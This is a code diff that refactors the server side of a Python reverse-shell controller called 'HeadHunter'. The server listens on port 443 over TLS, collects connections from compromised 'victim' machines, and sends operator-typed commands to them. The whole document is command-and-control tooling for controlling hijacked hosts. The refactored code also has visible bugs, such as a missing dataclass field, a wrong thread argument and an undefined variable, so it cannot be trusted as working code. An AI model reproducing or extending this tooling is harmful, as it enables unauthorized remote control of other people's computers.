@@ -1,79 +1,84 @@
 import socket
+import ssl
+import sys
 import threading
-import sys 
 import time
-import rsa
+
 from dataclasses import dataclass
 
-print("Generating RSA 2048 bit asymmetric encryption keys...")
-# Generate public and private RSA keys for the server
-public_key, private_key = rsa.newkeys(2048)
-public_partner = [None for i in range(100)]
-print("Done!\n")
 
-@dataclass
-class Zombie:
+@dataclass(frozen=True)
+class Victim:
     c: int
-    addr: tuple
-    public_partner: str
+    addr: tuple[str, int]
+    fd: int
 
-zombies = []
 
-# Continuously accept incoming zombie connectios
-def acceptor(s):
-		
-    global zombies
+class Server:
+    def __init__(self, ip: str = '0.0.0.0', port: int = 443):
+        self.victims: list[Victim] = []
+        self.socket: socket = None
+        self.port = port
+        self.activefd: int = 0
+        self.activeaddr: str = ""
 
-    while True:
+        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        context.load_default_certs()
+
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
+            sock.bind((ip, port))
+            sock.listen(5)
+            with context.wrap_socket(sock, server_side=True) as self.ssock:
+                self._listen()
+
+    def _acceptor(self) -> None:
+        # Continuously accept incoming zombie connections
+        while True:
+            c, addr = self.ssock.accept()
+            self.ssock.do_handshake()
+
+            c.send("BRUHGER\n")  # TODO Check if needs to removed
+
+            victim = Victim(c=c, addr=addr)
+            self.victims.append(
+                victim
+            )
+            print("\nGot connection from " + str(victim.addr) + " starting session. Type any command or press enter to return to previous session\n")
+
+    def _listen(self) -> None:
+        # Initial master socket configuration, socket list allocation, and initial client connection handshake 
+        print("Listening on port " + str(self.port) + " for connections...")
         
-        zombie = Zombie(0, (), "")
+        try:
+            c, addr = self.ssock.accept()
+        except ssl.SSLError as e:
+            print(f"Error giving victim a handshake :(\nError: {str(e)}")
+            return None
+        victim = Victim(c=c, addr=addr)
 
-        zombie.c, zombie.addr = s.accept()
-        zombie.c.send(public_key.save_pkcs1("PEM"))
-        zombie.public_partner = rsa.PublicKey.load_pkcs1(zombie.c.recv(2048))
-        print("\ngot connection from " + str(zombie.addr) + " starting session. Type any command or press enter to return to previous session\n")
-        zombies.append(zombie)	
-		
-# Initial master socket configuration, socket list allocation, and initial client connection handshake
-def listen(port):
-	
-	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.bind(("0.0.0.0", port))
-	s.listen(100);global zombies
+        print("Got connection from " + str(victim.addr) + ". Starting reverse shell session. Type \"exit\" to return to the HeadHunter interactive shell\n")
+        self.victims.append(victim)
 
-	print("\nListening on port " + str(port) + " for connections");zombie = Zombie(0, (), "")
-    
-	zombie.c, zombie.addr = s.accept()
-	zombie.c.send(public_key.save_pkcs1("PEM"))
-	zombie.public_partner = rsa.PublicKey.load_pkcs1(zombie.c.recv(2048))
+        acceptorThread = threading.Thread(target=self._acceptor, args=(self,), daemon=True)
+        acceptorThread.start()
 
-	print("got connection from " + str(zombie.addr) + ". Starting reverse shell session. Type \"exit\" to return to the HeadHunter interactive shell\n");zombies.append(zombie)
+        self._control(c)
 
-	acceptorThread = threading.Thread(target=acceptor, args=(s,), daemon=True)
-	acceptorThread.start()
-	global activefd
-	global activeaddr
-	activefd = zombie.c
-	activeaddr = zombie.addr
-	zombiepubkey = zombie.public_partner
-	control(activefd, zombiepubkey)
+    def _control(self, fd: int) -> None:
+        # Control session for selected victims
 
-# Control session for selected zombies
-def control(zombie, zombiepubkey):
+        try:
+            while True:	
+                d = input("Victim/> ")
 
-    try:
-        while True:	
+                if d == "exit":
+                    break
+                d += "\n"
 
-            d = input("Zombie/> ")
+                fd.send(d.encode())
+                data: str = fd.recv(15024)
 
-            if(d == "exit"):
-                break;
-            
-            d += "\n"
-            zombie.send(rsa.encrypt(d.encode(), zombiepubkey))
-
-            cmd = rsa.decrypt(zombie.recv(15024), private_key).decode()
-            sys.stdout.write(cmd)
-			
-    except Exception as e:
-        print("Error: " + str(e))
+                print(cmd)
+                
+        except Exception as e:
+            print("Error: " + str(e))
